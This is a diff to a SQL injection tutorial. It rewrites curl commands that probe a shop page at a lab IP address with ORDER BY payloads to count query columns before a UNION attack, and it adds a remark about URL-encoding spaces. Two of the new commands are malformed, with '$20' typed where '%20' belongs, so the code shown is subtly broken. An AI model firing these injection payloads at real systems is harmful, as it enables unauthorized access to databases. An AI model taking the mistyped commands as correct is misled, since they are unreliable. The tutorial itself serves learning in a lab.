@@ -363,10 +363,12 @@ curl "http://192.168.244.132/shop/products.php?id=1'"
 UNION requires both SELECT statements to have the **same number of columns**. You find the count using ORDER BY:
 
 ```bash
-curl "http://192.168.244.132/shop/products.php?id=1 ORDER BY 1"    # works
-curl "http://192.168.244.132/shop/products.php?id=1 ORDER BY 2"    # works
-curl "http://192.168.244.132/shop/products.php?id=1 ORDER BY 3"    # works
-curl "http://192.168.244.132/shop/products.php?id=1 ORDER BY 4"    # error!
+curl "http://192.168.244.132/shop/products.php?id=1%20ORDER%20BY%201"    # works
+curl "http://192.168.244.132/shop/products.php?id=1%20ORDER$20BY%202"    # works
+curl "http://192.168.244.132/shop/products.php?id=1%20ORDER$20BY%203"    # works
+curl "http://192.168.244.132/shop/products.php?id=1%20ORDER%20BY%204"    # error!
+
+# You need to do %20 for every white space because spaces break curl.
 ```
 
 **How ORDER BY works here:** `ORDER BY 1` sorts results by the first column. If the query has 3 columns, `ORDER BY 4` fails because there's no 4th column. So there are **3 columns**.
